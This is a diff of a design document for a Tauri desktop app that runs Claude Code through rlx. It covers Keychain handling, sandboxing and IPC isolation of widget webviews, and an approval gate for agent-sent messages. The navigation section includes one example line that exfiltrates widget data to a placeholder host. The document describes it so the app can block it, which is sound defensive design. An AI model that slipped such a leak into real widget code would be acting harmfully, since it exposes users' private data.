@@ -126,7 +126,7 @@ Claude Code is the only auth; the app has no accounts or tokens. `claude auth st
 
 **Keychain (ask E, answered by reading rlx's code, not by a live test).** rlx reads Claude Code's login via `/usr/bin/security` ([claude_accounts.py:1069](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/core/claude_accounts.py#L1069)), normally on the item's access list, so a GUI app triggers no prompt. Two cases still prompt:
 - a locked Keychain shows its unlock dialog (rlx waits 5 s, [:1071](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/core/claude_accounts.py#L1071));
-- if the access list lacks `security` (the item was made another way, or edited), macOS asks whether "security" may access it; a Deny comes back as an rlx error ([:1278](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/core/claude_accounts.py#L1278)), which the app shows with a fix-it hint.
+- if the access list lacks `security` (the item was made another way, or edited), macOS asks; a Deny returns an rlx error ([:1278](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/core/claude_accounts.py#L1278)) the app shows with a fix-it hint.
 
 The app never reads the item itself: it isn't on the access list. A Finder-launched app lacks the shell profile's variables, so the app reads `PATH`, `CLAUDE_CONFIG_DIR` and `CLAUDE_SECURESTORAGE_CONFIG_DIR` once from a login shell (`$SHELL -lc`) and passes them to rlx; the item name is hashed from the last two ([:1139](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/core/claude_accounts.py#L1139)).
 
@@ -221,28 +221,28 @@ Invalid data never reaches the widget (it keeps its last good data and shows `er
 **Per platform in v0:**
 - **macOS:** widgets render in the widget webview below; agent-made widgets turn on once the isolation probe passes.
 - **Windows:** the same design, but until the probe passes on Windows CI, agent-made widgets are **off** and built-ins only render data: no actions, no IPC.
-- **Linux** (CI smoke in v0): no child webview, since it can't be placed (below). Built-ins render as escaped React components in the main webview, with the same data contract; agent-made widgets are **off** until a placement route is proven (§16).
+- **Linux** (CI smoke in v0): no child webview, since it can't be placed (below). Built-ins render as escaped React in the main webview, same data contract; agent-made widgets are **off** until a placement route is proven (§16).
 
 **Why not iframes in the main webview** (T1): on Windows, wry injects init scripts into every subframe, so an iframe gets `__TAURI_INTERNALS__` and a keyed `invoke()`; Tauri counts registered schemes as local; and on Linux an iframe's IPC reports the main frame's URL. So widgets get nothing to call:
 - **The widget webview.** One child webview, `widgets`, holds the Home dashboard: a host page the app ships and a sandboxed iframe per widget, placed over the Home area. One for all should keep idle RAM in budget, but it adds a renderer process (unconfirmed; measured as in §1). `Window::add_child` needs Tauri's `unstable` feature (T1), a tracked risk.
 - **No capability.** All app commands are declared in an app manifest; without one, Tauri lets local webviews call them unchecked (T1). Capabilities name `webviews: ["main"]`, never a window, which would also match `widgets` (T1). So every command from `widgets` fails "not allowed by ACL", except Tauri's channel fetch, which reads only the caller's own queue, empty since data arrives by `eval` (T1).
-- **No IPC needed.** The core passes data in with `Webview::eval` of one fixed function. The host POSTs actions to `rlxwidget://localhost/host/action` (`http://rlxwidget.localhost/host/action` on Windows); the core's scheme handler accepts only the `widgets` label (T1) and the host page's origin, never a frame's `null`, then validates (§5.2).
+- **No IPC needed.** The core passes data in via `Webview::eval` of one fixed function. The host POSTs actions to `rlxwidget://localhost/host/action`, which the core's scheme handler accepts only from the `widgets` label (T1) and the host origin, never a frame's `null`, then validates (§5.2).
 - **Linux can't place it.** There `add_child` packs the webview into the window's GtkBox to fill it, and `set_bounds` moves only X11 or GtkFixed children (T1), so position and size are ignored.
 - **The scheme stays registered.** A loopback HTTP server would also make widgets non-local but opens a port any local process can reach; with the manifest and webview-scoped capabilities, "local" grants nothing.
 
 Further layers:
 - **The iframe.** `<iframe sandbox="allow-scripts">`, **no `allow-same-origin`**, no popups, top navigation or forms: no cookies, storage or host DOM access.
-- **Serving.** Widget documents carry their CSP as a header and first `<meta>` (policies below). On Windows wry rewrites only the `rlxwidget://localhost/…` form (T1), so the host or widget ID lives in the path: `rlxwidget://localhost/<id>/<version>/` or `/host/`, served on Windows as `http://rlxwidget.localhost/<id>/<version>/`.
+- **Serving.** Widget documents carry their CSP as a header and first `<meta>` (policies below). On Windows, wry swaps the `rlxwidget://` prefix for `http://rlxwidget.` (any host) only in the start URL and serves only `http://rlxwidget.*` (T1), so pages there use `http://rlxwidget.localhost/…` themselves. Every URL keeps the host or ID in the path (`rlxwidget://localhost/<id>/<version>/`, `/host/`): one origin per platform.
 - **Images.** Connector images arrive as data URLs fetched by the core. Slack's private files need credentials the app lacks, so they show a placeholder that opens Slack; remote email images (often tracking pixels) are off by default.
 - **Navigation.** CSP has no `navigate-to`, so a widget could leak data by navigating itself (`location.href = "https://x/?" + data`). The core denies navigation outside the app's origin and the widget scheme. wry covers every navigation on macOS and Linux but only top-level ones on Windows (T1), where the core adds WebView2's `FrameNavigationStarting` (that it catches sandboxed frames is unconfirmed).
 - **The bridge.** The host posts `init` and a `MessageChannel` port to `iframe.contentWindow` (target `"*"`: the origin is opaque) and accepts only messages from that iframe, validated and rate-limited (20/s); the core re-validates actions.
-- **The isolation probe** runs in the skeleton tests on macOS and the native end-to-end tests on Windows CI. The host page is the top level of `widgets`, so `__TAURI_INTERNALS__` there, and raw `postMessage` or `messageHandlers` reaching Tauri, are expected. `invoke()` even falls back to `postMessage` when its IPC fetch is blocked (T1). The barrier is command rejection, not delivery:
-  - from the host page and from a widget iframe, every app and plugin command is rejected (the channel fetch aside), and a test-build canary command records 0 calls;
-  - from the iframe only, `window.chrome.webview.postMessage` and `window.webkit.messageHandlers` never reach Tauri (unconfirmed: wry hooks only the top-level `WebMessageReceived`, T1), and `fetch` to `ipc://localhost` or `http://ipc.localhost` is blocked;
+- **The isolation probe** runs in the skeleton tests on macOS and the native end-to-end tests on Windows CI, with one rule for every channel on every platform. From the host page and from a widget iframe, raw channels (`chrome.webview.postMessage`, `webkit.messageHandlers`, an `ipc://` fetch) may or may not deliver (T1: WebKit takes messages from any frame; `invoke()` falls back to `postMessage`). What must hold:
+  - every app and plugin command is rejected, by the missing key or the ACL, with the channel fetch the only exemption;
+  - a test-build canary command records 0 calls;
   - the action route rejects the main webview and frames;
   - `fetch`, self-navigation, `RTCPeerConnection`, `dns-prefetch` and `preconnect` to a local listener reach nothing.
 
-  Until it passes on a platform, "no network" and "no IPC" are unconfirmed there, and agent-made widgets stay off.
+  For information only (unconfirmed): wry hooks just WebView2's top-level `WebMessageReceived` (T1), so a WebView2 iframe's `postMessage` may never arrive. Until the probe passes on a platform, "no network" and "no IPC" are unconfirmed there, and agent-made widgets stay off.
 - **The main window is privileged:** its IPC approves Drafts and approvals and enables Auto, and it shows connector and agent text. So:
   - that text renders only as escaped text or sanitized markdown (no raw HTML or remote images; links show their real host and open through the core);
   - **Approve** sends the draft ID and the hash of what was shown, and the core refuses if the draft changed;
@@ -311,7 +311,7 @@ stateDiagram-v2
 - **Streaming:** `RunEvent`s go to the transcript and the event bus with their `seq`; runs on screen get partial text (`--include-partial-messages`, E2).
 - **Concurrency:** at most 2 tasks; refreshes run singly and coalesce; `RateLimited` backs everything off; refreshes pause above a plan-usage threshold.
 - **Cancel:** `Engine.cancel()` has rlxd kill the run's process tree; the run becomes `failed {reason: "cancelled"}`, keeping partial output.
-- **Reconcile on launch.** rlxd outlives the app, so the core calls `runs()` instead of guessing:
+- **Reconcile on launch.** rlxd outlives the app, so the core calls `runs()`:
   - runs still live are re-attached from the last stored `seq`;
   - Tasks rlxd reports dead are resumed (from the session ID, ask I), and refreshes rerun;
   - **a `SendExecutor` whose call may have run is never retried:** the core asks rlxd whether its call returned, and only if rlxd doesn't know does it go to needs-you ("this may have sent; check first");
@@ -345,7 +345,7 @@ Plain-text parts put the URL in parentheses, names are escaped per target, and m
 
 ### 8.1 One gate, one path
 
-**Three modes** (owner decision): **Draft** (the default: the owner approves every send), **Standing approval** (a confirmed approval plus the send-time check, §8.2 and §8.3) and **Auto** (opt-in per connector: a 10 s hold with Undo). All three share one gate and one path, and the table below says who approves each Draft.
+**Three modes** (owner decision): **Draft** (the default: the owner approves every send), **Standing approval** (a confirmed approval plus the send-time check, §8.2 and §8.3) and **Auto** (opt-in per connector: a 10 s hold with Undo). All three share one gate and one path.
 
 **The gate sees every call.** Claude Code pre-allows anything in `--allowedTools` (E2) or the user's `permissions.allow`, past any permission prompt. So, as in the rlx 0.10.3 handoff:
 - `--allowedTools` is never passed, and `--setting-sources project` keeps user settings out;
@@ -413,7 +413,7 @@ type WatchJob = {                     // no prompt: one pinned call per tick
 };
 ```
 
-**Lifecycle.** The owner types "when CI is green, post in #dev asking for approval". A tool-less `ParseInstruction` run, seeing only that text, proposes the fields as a card (*"Nova will post in #dev when CI on main is green, asking for approval to deploy. Once."*), confirmed in a native dialog. Edits revoke and re-propose; `once` approvals become `used` after sending.
+**Lifecycle.** The owner types "when CI is green, post in #dev asking for approval". A tool-less `ParseInstruction` run, seeing only that text, proposes the fields as a card (*"Nova will post in #dev when CI on main is green, asking for approval to deploy. Once."*), confirmed in a native dialog. Edits revoke and re-propose; `once` approvals become `used` after sending; the Approvals tab lists and revokes them.
 
 **Watches can't be steered.** A `WatchJob` has no prompt: each tick makes one pinned call, the gate allows only that input (hash-checked as for `SendExecutor`), and `match` reads that call's raw result, so content read later can't change which item is checked. Until rlxd can call a tool without a model turn (ask H), a `Watch` run is told to make only that call; that rlxd exposes raw tool results is unconfirmed.
 
@@ -489,13 +489,13 @@ So the app checks `rlx --json upgrade --check` (fields at [install.py:96-105](ht
 | Arch | arm64 | x64 | x64 |
 | Webview | WKWebView | WebView2 | WebKitGTK 4.1 (**risk**) |
 | Widget URL | `rlxwidget://localhost/…` | `http://rlxwidget.localhost/…` | None (no widget webview in v0) |
-| Widgets in v0 | Agent-made after the §5.3 probe | Built-ins render only; agent-made off until the probe passes | Built-ins as escaped React in main; agent-made off until placement is proven |
+| Widgets in v0 | Agent-made after the §5.3 probe | Built-ins render only; agent-made off until the probe passes | Built-ins as React in main; agent-made off until placement works |
 | Tray | Menu bar (template icon) | System tray | AppIndicator (GNOME needs an extension) |
 | Engine | `FakeEngine`, then `RlxEngine` | Same; rlx's installer needs ask D | Same |
 
 ## 13. Testing
 
-- **UI:** a ui-tester agent drives the web UI on Vite with `FakeEngine` (no rlx, Claude Code or network).
+- **UI:** a ui-tester agent drives the web UI on Vite with `FakeEngine`.
 - **macOS native:** window, tray and menu checks capture only the app's window with `screencapture -l <windowid>` and drive menus with osascript; never full-screen captures.
 - **Windows and Linux:** tauri-driver in CI, with screenshots as artifacts; on Windows the native end-to-end tests run the §5.3 isolation probe, and Linux is a CI smoke test. Every CI run launches, renders and quits.
 - **Gate:** the §8.5 corpus; a tool-less run's connector call is denied; with no app gate client, a read call is denied and a due job records `job.skipped {reason: app_absent}` with no run; after reconnect, `catch_up: once` fires once and `skip` waits.
@@ -513,7 +513,7 @@ So the app checks `rlx --json upgrade --check` (fields at [install.py:96-105](ht
 
 ## 15. rlx dependency
 
-**The split, rejected.** The survey proposed simple mode driving `claude -p` directly, with the fleet for developers; on 2026-11-25 the owner ruled that all agent work, in both modes, goes through rlx.
+**The split, rejected.** The survey's direct-`claude -p` simple mode was rejected on 2026-11-25: all agent work, in both modes, goes through rlx.
 
 **The engine is rlxd** (owner decision, 2026-11-25): a long-running Rust daemon in rlx's Cargo workspace, shipped with rlx, with a client crate rlxapp depends on. It replaces tmux as process host (portable-pty, ConPTY on Windows), runs headless Claude Code emitting stream-json, takes hooks over a local socket, runs the user scheduler and pushes events to the TUI, rlxapp and Remote; Python stays the orchestration brain and TUI. rlx 0.10.3 carries rlxd, native Windows, the connector surface, a non-project home and asks A–D; rlx's `docs/plans/0.10.3-handoff.md` drafts the app contract.
 
@@ -560,7 +560,7 @@ This doc adds:
 2. rlxd's event transport, auth and `schema_version` (ask C).
 3. Where is the non-developer home? (User hooks stay out: `--setting-sources project`.)
 
-**Follow-ups:** a Linux placement route for the widget webview (a GtkFixed parent or an upstream wry/Tauri change), proven in CI before agent-made widgets ship on Linux.
+**Follow-ups:** prove a Linux placement route for the widget webview (a GtkFixed parent or an upstream wry/Tauri change) in CI.
 
 ## 17. Traceability
 
@@ -604,4 +604,4 @@ All read-only: no sign-in or sign-out, no connector tool call, nothing sent.
 | R6 | `rlx serve --help` | MCP server, `--stdio`, `--port`, bearer token |
 | R7 | `rlx remote --help`; `rlx remote serve --help` | Phone access, password, `regenerate-password`, devices; `--auto-off MINUTES`, ngrok |
 | R8 | `rlx watch --help` | `--detach` "in a window of the fleet's tmux server" |
-| T1 | wry 0.57.4, tauri-runtime-wry 2.12.5, tauri 2.12.7 sources (crates.io) | wry `src/lib.rs` :1217-1219 Windows rewrites `{scheme}://localhost/…` to `http(s)://{scheme}.localhost/…`; :1029, :2642-2643 Windows injects init scripts into subframes; :1174 Linux iframe IPC reports the main frame's URL. `wkwebview/navigation.rs:64-102`, `webkitgtk/mod.rs:563-590` handle every navigation; `webview2/mod.rs:790` only `NavigationStarting`; `:525-526`, `:1006` IPC on the top-level `WebMessageReceived`. `webkitgtk/mod.rs:342-344` no X11 data; `:698-702` GtkBox `pack_start` fills; `:978-997` `set_bounds` moves only X11 or GtkFixed children. tauri-runtime-wry `src/lib.rs` :379 `add_child` is a `WindowChild`; :5179-5182 built into the window's vbox; :5109 every webview gets an IPC handler. tauri `src/error.rs:166-167` bad invoke key rejected; `manager/webview.rs:164` main-frame-only flag; `scripts/ipc-protocol.js:61-66`, `:84` `postMessage` fallback; `webview/mod.rs:1978-1989` registered schemes are local; `:2080-2083` app commands ACL-checked only with a manifest or non-local origin; `:2082` channel-fetch exemption; `ipc/channel.rs:44-45`, `:496` per-webview queue; `ipc/authority.rs:477-478` webview or window label; `window/mod.rs:1224-1226` `add_child` needs `unstable`; `app.rs:2648` scheme handler sees the webview label |
+| T1 | wry 0.57.4, tauri-runtime-wry 2.12.5, tauri 2.12.7 sources (crates.io) | wry `src/lib.rs` :1029, :2642-2643 Windows injects init scripts into subframes; :1174 Linux iframe IPC reports the main frame's URL. `custom_protocol_workaround.rs:21-27` swaps `{scheme}://` for `http(s)://{scheme}.` (any host), only on the start URL (`webview2/mod.rs:628-633`); `webview2/mod.rs:1058-1060` serves only `http(s)://{scheme}.*`. `wkwebview/class/wry_web_view_delegate.rs:49-60`, `:98` and `webkitgtk/mod.rs:740-757` pass script messages from any frame to the IPC handler; `wkwebview/mod.rs:692-697` only `window.ipc` is main-frame-only. `wkwebview/navigation.rs:64-102`, `webkitgtk/mod.rs:563-590` handle every navigation; `webview2/mod.rs:790` only `NavigationStarting`; `:525-526`, `:1006` IPC on the top-level `WebMessageReceived`. `webkitgtk/mod.rs:342-344` no X11 data; `:698-702` GtkBox `pack_start` fills; `:978-997` `set_bounds` moves only X11 or GtkFixed children. tauri-runtime-wry `src/lib.rs` :379 `add_child` is a `WindowChild`; :5179-5182 built into the window's vbox; :5109 every webview gets an IPC handler. tauri `src/error.rs:166-167` bad invoke key rejected; `manager/webview.rs:164` main-frame-only flag; `scripts/ipc-protocol.js:61-66`, `:84` `postMessage` fallback; `webview/mod.rs:1978-1989` registered schemes are local; `:2080-2083` app commands ACL-checked only with a manifest or non-local origin; `:2082` channel-fetch exemption; `ipc/channel.rs:44-45`, `:496` per-webview queue; `ipc/authority.rs:477-478` webview or window label; `window/mod.rs:1224-1226` `add_child` needs `unstable`; `app.rs:2648` scheme handler sees the webview label |
